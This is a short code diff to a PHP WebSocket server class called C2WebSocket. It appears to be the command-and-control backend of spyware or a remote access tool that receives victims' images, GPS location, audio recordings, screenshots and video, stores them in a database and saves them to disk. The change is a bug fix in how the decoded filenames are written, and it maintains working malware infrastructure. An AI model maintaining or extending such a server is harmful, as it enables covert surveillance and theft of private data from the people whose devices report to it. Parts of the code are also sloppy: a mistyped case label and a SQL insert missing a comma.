@@ -87,7 +87,7 @@ class C2WebSocket implements MessageComponentInterface {
                 $filename = base64_decode($data['filename']);
                 $timestamp = $data['timestamp'];
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
-                $this->writeFile($data['content'], $data['filename'], 'images');
+                $this->writeFile($data['content'], $filename, 'images');
                 break;
             case "location":
                 $query = "INSERT INTO LOCATION(client_id, latitude, longitude altitude) VALUES(?, ?, ?, ?)";
@@ -114,21 +114,21 @@ class C2WebSocket implements MessageComponentInterface {
                 $filename = base64_decode($data['filename']);
                 $timestamp = $data['timestamp'];
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
-                $this->writeFile($data['content'], $data['filename'], 'recordings');
+                $this->writeFile($data['content'], $filename, 'recordings');
                 break;
             case "screesnshot":
                 $query = "INSERT INTO SCREENSHOT(client_id, filename, timestamp) VALUES(?, ?, ?)";
                 $filename = base64_decode($data['filename']);
                 $timestamp = $data['timestamp'];
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
-                $this->writeFile($data['content'], $data['filename'], 'screenshots');
+                $this->writeFile($data['content'], $filename, 'screenshots');
                 break;
             case "video":
                 $query = "INSERT INTO VIDEO(client_id, filename, timestamp) VALUES(?, ?, ?)";
                 $filename = base64_decode($data['filename']);
                 $timestamp = $data['timestamp'];
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
-                $this->writeFile($data['content'], $data['filename'], 'videos');
+                $this->writeFile($data['content'], $filename, 'videos');
                 break;
             default:
                 break;
